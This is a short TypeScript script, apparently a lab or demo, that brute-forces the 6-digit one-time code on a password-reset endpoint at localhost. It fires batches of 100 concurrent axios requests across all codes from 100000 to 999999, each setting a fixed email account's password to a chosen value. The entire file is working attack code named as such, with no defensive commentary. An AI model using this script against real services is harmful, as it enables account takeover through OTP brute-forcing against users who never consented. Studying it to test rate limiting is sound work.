import axios from "axios";

async function attackLogic(otp: string) {
  try {
    const a = await axios.post("http://localhost:3000/reset-password", {
      email: "hola@gmail.com",
      otp: otp,
      password: "abcd@abcd",
    });
  } catch (err: any) {
    console.log(err.message);
  }
}

async function main() {
  for (let i = 100000; i < 1000000; i += 100) {
    const promises = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      promises.push(attackLogic((i + j).toString()));
    }
    await Promise.all(promises);
  }
}

main();
